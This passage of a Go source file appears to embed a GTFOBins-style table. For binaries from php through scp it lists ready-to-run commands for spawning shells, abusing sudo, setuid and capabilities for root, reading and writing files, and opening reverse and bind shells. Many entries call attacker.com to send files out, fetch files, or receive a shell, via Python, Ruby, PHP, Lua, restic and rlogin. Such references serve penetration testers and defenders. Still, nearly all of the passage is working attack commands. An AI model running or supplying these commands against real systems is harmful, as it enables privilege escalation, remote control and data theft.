php -r 'print(shell_exec(getenv("CMD")));'
`, "code"},
			Functions{`export CMD="/bin/sh"
php -r '$r=array(); exec(getenv("CMD"), $r); print(join("\\n",$r));'
`, "code"},
			Functions{`export CMD="/bin/sh"
php -r '$h=@popen(getenv("CMD"),"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
`, "code"},
		},
		"command": []Functions{
			Functions{`export CMD="id"
php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open(getenv("CMD"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.`, "description"},
			Functions{`LHOST=0.0.0.0
LPORT=8888
php -S $LHOST:$LPORT
`, "code"},
		},
		"sudo": []Functions{
			Functions{`CMD="/bin/sh"
sudo php -r "system('$CMD');"
`, "code"},
		},
		"capabilities": []Functions{
			Functions{`CMD="/bin/sh"
./php -r "posix_setuid(0); system('$CMD');"
`, "code"},
		},
	},
	"pic": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
pic $LFILE
`, "code"},
			Functions{`The output is prefixed with a some content as a header.`, "description"},
		},
		"shell": []Functions{
			Functions{`pic -U
.PS
sh X sh X
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo pic -U
.PS
sh X sh X
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./pic -U
.PS
sh X sh X
`, "code"},
		},
	},
	"pico": map[string][]Functions{
		"shell": []Functions{
			Functions{`pico
^R^X
reset; sh 1>&0 2>&0
`, "code"},
			Functions{`The 'SPELL' environment variable can be used in place of the '-s' option if the command line cannot be changed.`, "description"},
			Functions{`pico -s /bin/sh
/bin/sh
^T
`, "code"},
		},
		"file-write": []Functions{
			Functions{`pico file_to_write
DATA
^O
`, "code"},
		},
		"file-read": []Functions{
			Functions{`pico file_to_read`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`The 'SPELL' environment variable can be used in place of the '-s' option if the command line cannot be changed.`, "description"},
			Functions{`./pico -s /bin/sh
/bin/sh
^T
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo pico
^R^X
reset; sh 1>&0 2>&0
`, "code"},
		},
	},
	"pip": map[string][]Functions{
		"file-write": []Functions{
			Functions{`It needs an absolute local file path.`, "description"},
			Functions{`export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo "open('$LFILE','w+').write('DATA')" > $TF/setup.py
pip install $TF
`, "code"},
		},
		"file-read": []Functions{
			Functions{`The read file content is corrupted as wrapped within an exception error.`, "description"},
			Functions{`TF=$(mktemp -d)
echo 'raise Exception(open("file_to_read").read())' > $TF/setup.py
pip install $TF
`, "code"},
		},
		"library-load": []Functions{
			Functions{`TF=$(mktemp -d)
echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py
pip install $TF
`, "code"},
		},
		"sudo": []Functions{
			Functions{`TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
`, "code"},
		},
		"shell": []Functions{
			Functions{`TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
pip install $TF
`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`Run ''socat file:'tty',raw,echo=0 tcp-listen:12345'' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' > $TF/setup.py
pip install $TF
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.`, "description"},
			Functions{`export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' > $TF/setup.py
pip install $TF
`, "code"},
			Functions{`Serve files in the local folder running an HTTP server.`, "description"},
			Functions{`export LPORT=8888
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
pip install $TF
`, "code"},
		},
		"file-download": []Functions{
			Functions{`Fetch a remote file via HTTP GET request. It needs an absolute local file path.`, "description"},
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])' > $TF/setup.py
pip install $TF
`, "code"},
		},
	},
	"pkexec": map[string][]Functions{
		"sudo": []Functions{
			Functions{`sudo pkexec /bin/sh`, "code"},
		},
	},
	"pkg": map[string][]Functions{
		"sudo": []Functions{
			Functions{`It runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
'''
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
'''
`, "description"},
			Functions{`sudo pkg install -y --no-repo-update ./x-1.0.txz
`, "code"},
		},
	},
	"pr": map[string][]Functions{
		"suid": []Functions{
			Functions{`LFILE=file_to_read
pr -T $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
pr -T $LFILE
`, "code"},
		},
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
pr -T $LFILE
`, "code"},
		},
	},
	"pry": map[string][]Functions{
		"shell": []Functions{
			Functions{`pry
system("/bin/sh")
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo pry
system("/bin/sh")
`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./pry
system("/bin/sh")
`, "code"},
		},
	},
	"psql": map[string][]Functions{
		"shell": []Functions{
			Functions{`psql
\?
!/bin/sh
`, "code"},
		},
		"sudo": []Functions{
			Functions{`psql
\?
!/bin/sh
`, "code"},
		},
	},
	"puppet": map[string][]Functions{
		"shell": []Functions{
			Functions{`puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
`, "code"},
		},
		"file-write": []Functions{
			Functions{`The file path must be absolute.`, "description"},
			Functions{`LFILE="/tmp/file_to_write"
puppet apply -e "file { '$LFILE': content => 'DATA' }"
`, "code"},
		},
		"file-read": []Functions{
			Functions{`The read file content is corrupted by the 'diff' output format. The actual '/usr/bin/diff' command is executed.`, "description"},
			Functions{`LFILE=file_to_read
puppet filebucket -l diff /dev/null $LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"
`, "code"},
		},
	},
	"python": map[string][]Functions{
		"shell": []Functions{
			Functions{`python -c 'import os; os.system("/bin/sh")'`, "code"},
		},
		"file-download": []Functions{
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])'
`, "code"},
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
		},
		"file-read": []Functions{
			Functions{`python -c 'print(open("file_to_read").read())'`, "code"},
		},
		"library-load": []Functions{
			Functions{`python -c 'from ctypes import cdll; cdll.LoadLibrary("lib.so")'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo python -c 'import os; os.system("/bin/sh")'`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`Run ''socat file:'tty',raw,echo=0 tcp-listen:12345'' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.`, "description"},
			Functions{`export URL=http://attacker.com/
export LFILE=file_to_send
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))'
`, "code"},
			Functions{`Serve files in the local folder running an HTTP server.`, "description"},
			Functions{`export LPORT=8888
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()'
`, "code"},
		},
		"file-write": []Functions{
			Functions{`python -c 'open("file_to_write","w+").write("DATA")'`, "code"},
		},
		"suid": []Functions{
			Functions{`./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`, "code"},
		},
		"capabilities": []Functions{
			Functions{`./python -c 'import os; os.setuid(0); os.system("/bin/sh")'`, "code"},
		},
	},
	"rake": map[string][]Functions{
		"limited-suid": []Functions{
			Functions{`./rake -p ''/bin/sh 1>&0''`, "code"},
		},
		"file-read": []Functions{
			Functions{`The file is actually parsed and the first wrong line is returned in an error message.`, "description"},
			Functions{`LFILE=file-to-read
rake -f $LFILE
`, "code"},
		},
		"shell": []Functions{
			Functions{`rake -p ''/bin/sh 1>&0''`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo rake -p ''/bin/sh 1>&0''`, "code"},
		},
	},
	"readelf": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
readelf -a @$LFILE
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./readelf -a @$LFILE
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo readelf -a @$LFILE
`, "code"},
		},
	},
	"red": map[string][]Functions{
		"file-write": []Functions{
			Functions{`red file_to_write
a
DATA
.
w
q
`, "code"},
		},
		"file-read": []Functions{
			Functions{`red file_to_read
,p
q
`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo red file_to_write
a
DATA
.
w
q
`, "code"},
		},
	},
	"redcarpet": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
redcarpet "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo redcarpet "$LFILE"
`, "code"},
		},
	},
	"restic": map[string][]Functions{
		"file-upload": []Functions{
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
`, "code"},
		},
		"sudo": []Functions{
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
`, "code"},
		},
		"suid": []Functions{
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
`, "code"},
		},
	},
	"rev": map[string][]Functions{
		"file-read": []Functions{
			Functions{`LFILE=file_to_read
rev $LFILE | rev
`, "code"},
		},
		"suid": []Functions{
			Functions{`LFILE=file_to_read
./rev $LFILE | rev
`, "code"},
		},
		"sudo": []Functions{
			Functions{`LFILE=file_to_read
sudo rev $LFILE | rev
`, "code"},
		},
	},
	"rlogin": map[string][]Functions{
		"file-upload": []Functions{
			Functions{`Send contents of a file to a TCP port. Run 'nc -l -p 12345 > "file_to_save"' on the attacker system to capture the contents.

'rlogin' hangs waiting for the remote peer to close the socket.

The file is corrupted by leading and trailing spurious data.
`, "description"},
			Functions{`RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
rlogin -l "$(cat $LFILE)" -p $RPORT $RHOST
`, "code"},
		},
	},
	"rlwrap": map[string][]Functions{
		"shell": []Functions{
			Functions{`rlwrap /bin/sh`, "code"},
		},
		"file-write": []Functions{
			Functions{`This adds timestamps to the output file. This relies on the external 'echo' command.`, "description"},
			Functions{`LFILE=file_to_write
rlwrap -l "$LFILE" echo DATA
`, "code"},
		},
		"suid": []Functions{
			Functions{`./rlwrap -H /dev/null /bin/sh -p`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo rlwrap /bin/sh`, "code"},
		},
	},
	"rpm": map[string][]Functions{
		"shell": []Functions{
			Functions{`rpm --eval '%{lua:os.execute("/bin/sh")}'`, "code"},
			Functions{`rpm --pipe '/bin/sh 0<&1'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./rpm --eval '%{lua:os.execute("/bin/sh")}'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo rpm --eval '%{lua:os.execute("/bin/sh")}'`, "code"},
			Functions{`It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
'''
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
'''
`, "description"},
			Functions{`sudo rpm -ivh x-1.0-1.noarch.rpm
`, "code"},
		},
	},
	"rpmquery": map[string][]Functions{
		"shell": []Functions{
			Functions{`rpmquery --eval '%{lua:posix.exec("/bin/sh")}'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`./rpmquery --eval '%{lua:os.execute("/bin/sh")}'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo rpmquery --eval '%{lua:posix.exec("/bin/sh")}'`, "code"},
		},
	},
	"rsync": map[string][]Functions{
		"shell": []Functions{
			Functions{`rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`, "code"},
		},
		"suid": []Functions{
			Functions{`./rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`, "code"},
		},
	},
	"ruby": map[string][]Functions{
		"reverse-shell": []Functions{
			Functions{`Run 'nc -l -p 12345' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.`, "description"},
			Functions{`export LPORT=8888
ruby -run -e httpd . -p $LPORT
`, "code"},
		},
		"file-write": []Functions{
			Functions{`ruby -e 'File.open("file_to_write", "w+") { |f| f.write("DATA") }'`, "code"},
		},
		"shell": []Functions{
			Functions{`ruby -e 'exec "/bin/sh"'`, "code"},
		},
		"file-read": []Functions{
			Functions{`ruby -e 'puts File.read("file_to_read")'`, "code"},
		},
		"library-load": []Functions{
			Functions{`ruby -e 'require "fiddle"; Fiddle.dlopen("lib.so")'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo ruby -e 'exec "/bin/sh"'`, "code"},
		},
		"capabilities": []Functions{
			Functions{`./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'`, "code"},
		},
		"file-download": []Functions{
			Functions{`Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
ruby -e 'require "open-uri"; download = open(ENV["URL"]); IO.copy_stream(download, ENV["LFILE"])'
`, "code"},
		},
	},
	"run-mailcap": map[string][]Functions{
		"shell": []Functions{
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`run-mailcap --action=view /etc/hosts
!/bin/sh
`, "code"},
		},
		"file-read": []Functions{
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`run-mailcap --action=view file_to_read`, "code"},
		},
		"file-write": []Functions{
			Functions{`The file must exist and be not empty.

This invokes the default editor, which is likely to be ['vi'](/gtfobins/vi/), other functions may apply.
`, "description"},
			Functions{`run-mailcap --action=edit file_to_read`, "code"},
		},
		"sudo": []Functions{
			Functions{`This invokes the default pager, which is likely to be ['less'](/gtfobins/less/), other functions may apply.`, "description"},
			Functions{`sudo run-mailcap --action=view /etc/hosts
!/bin/sh
`, "code"},
		},
	},
	"run-parts": map[string][]Functions{
		"shell": []Functions{
			Functions{`run-parts --new-session --regex '^sh$' /bin`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo run-parts --new-session --regex '^sh$' /bin`, "code"},
		},
		"suid": []Functions{
			Functions{`./run-parts --new-session --regex '^sh$' /bin --arg='-p'`, "code"},
		},
	},
	"rview": map[string][]Functions{
		"file-download": []Functions{
			Functions{`This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3. Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
`, "code"},
			Functions{`Fetch a remote file via TCP. Run 'nc target.com 12345 < "file_to_send"' on the attacker box to send the file. This requires that 'rview' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export LPORT=12345
export LFILE=file_to_save
rview -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open(os.getenv("LFILE"), "wb");
  f:write(d);
  io.close(f);'
`, "code"},
		},
		"file-write": []Functions{
			Functions{`rview file_to_write
iDATA
^[
w!
`, "code"},
		},
		"file-read": []Functions{
			Functions{`rview file_to_read`, "code"},
		},
		"sudo": []Functions{
			Functions{`This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`sudo rview -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
			Functions{`This requires that 'rview' is compiled with Lua support.`, "description"},
			Functions{`sudo rview -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"capabilities": []Functions{
			Functions{`This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`./rview -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
		},
		"non-interactive-reverse-shell": []Functions{
			Functions{`Run ''nc -l -p 12345'' on the attacker box to receive the shell. This requires that 'rview' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
rview -c ':lua local s=require("socket"); local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
`, "code"},
		},
		"non-interactive-bind-shell": []Functions{
			Functions{`Run 'nc target.com 12345' on the attacker box to connect to the shell. This requires that 'rview' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export LPORT=12345
rview -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`export URL=http://attacker.com/
export LFILE=file_to_send
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
vim.command(":q!")'
`, "code"},
			Functions{`This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.`, "description"},
			Functions{`This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3. Serve files in the local folder running an HTTP server.`, "description"},
			Functions{`export LPORT=8888
rview -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'
`, "code"},
			Functions{`Send a local file via TCP. Run 'nc -l -p 12345 > "file_to_save"' on the attacker box to collect the file. This requires that 'rview' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
rview -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  t:send(d);
  t:close();'
`, "code"},
		},
		"library-load": []Functions{
			Functions{`This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'`, "code"},
		},
		"suid": []Functions{
			Functions{`This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`./rview -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`This requires that 'rview' is compiled with Lua support.`, "description"},
			Functions{`./rview -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"shell": []Functions{
			Functions{`This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`rview -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
			Functions{`This requires that 'rview' is compiled with Lua support.`, "description"},
			Functions{`rview -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`This requires that 'rview' is compiled with Python support. Prepend ':py3' for Python 3. Run ''socat file:'tty',raw,echo=0 tcp-listen:12345'' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
rview -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
`, "code"},
		},
	},
	"rvim": map[string][]Functions{
		"non-interactive-reverse-shell": []Functions{
			Functions{`Run ''nc -l -p 12345'' on the attacker box to receive the shell. This requires that 'rvim' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
rvim -c ':lua local s=require("socket"); local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.`, "description"},
			Functions{`export URL=http://attacker.com/
export LFILE=file_to_send
rvim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
vim.command(":q!")'
`, "code"},
			Functions{`This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3. Serve files in the local folder running an HTTP server.`, "description"},
			Functions{`export LPORT=8888
rvim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'
`, "code"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
rvim -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  t:send(d);
  t:close();'
`, "code"},
			Functions{`Send a local file via TCP. Run 'nc -l -p 12345 > "file_to_save"' on the attacker box to collect the file. This requires that 'rvim' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
		},
		"file-download": []Functions{
			Functions{`This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3. Fetch a remote file via HTTP GET request.`, "description"},
			Functions{`export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
rvim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
`, "code"},
			Functions{`export LPORT=12345
export LFILE=file_to_save
rvim -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open(os.getenv("LFILE"), "wb");
  f:write(d);
  io.close(f);'
`, "code"},
			Functions{`Fetch a remote file via TCP. Run 'nc target.com 12345 < "file_to_send"' on the attacker box to send the file. This requires that 'rvim' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
		},
		"file-write": []Functions{
			Functions{`rvim file_to_write
iDATA
^[
w
`, "code"},
		},
		"file-read": []Functions{
			Functions{`rvim file_to_read`, "code"},
		},
		"suid": []Functions{
			Functions{`This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`./rvim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'`, "code"},
		},
		"limited-suid": []Functions{
			Functions{`This requires that 'rvim' is compiled with Lua support.`, "description"},
			Functions{`./rvim -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"shell": []Functions{
			Functions{`This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
			Functions{`This requires that 'rvim' is compiled with Lua support.`, "description"},
			Functions{`rvim -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"reverse-shell": []Functions{
			Functions{`This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3. Run ''socat file:'tty',raw,echo=0 tcp-listen:12345'' on the attacker box to receive the shell.`, "description"},
			Functions{`export RHOST=attacker.com
export RPORT=12345
rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
`, "code"},
		},
		"non-interactive-bind-shell": []Functions{
			Functions{`Run 'nc target.com 12345' on the attacker box to connect to the shell. This requires that 'rvim' is compiled with Lua support and that 'lua-socket' is installed.`, "description"},
			Functions{`export LPORT=12345
rvim -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
`, "code"},
		},
		"library-load": []Functions{
			Functions{`This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary("lib.so"); vim.command(":q!")'`, "code"},
		},
		"sudo": []Functions{
			Functions{`sudo rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
			Functions{`This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`This requires that 'rvim' is compiled with Lua support.`, "description"},
			Functions{`sudo rvim -c ':lua os.execute("reset; exec sh")'`, "code"},
		},
		"capabilities": []Functions{
			Functions{`This requires that 'rvim' is compiled with Python support. Prepend ':py3' for Python 3.`, "description"},
			Functions{`./rvim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`, "code"},
		},
	},
	"scp": map[string][]Functions{
		"limited-suid": []Functions{
			Functions{`TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
./scp -S $TF a b:
`, "code"},
		},
		"shell": []Functions{
			Functions{`TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
scp -S $TF x y:
`, "code"},
		},
		"file-upload": []Functions{
			Functions{`Send local file to a SSH server.`, "description"},
			Functions{`RPATH=user@attacker.com:~/file_to_save
LPATH=file_to_send
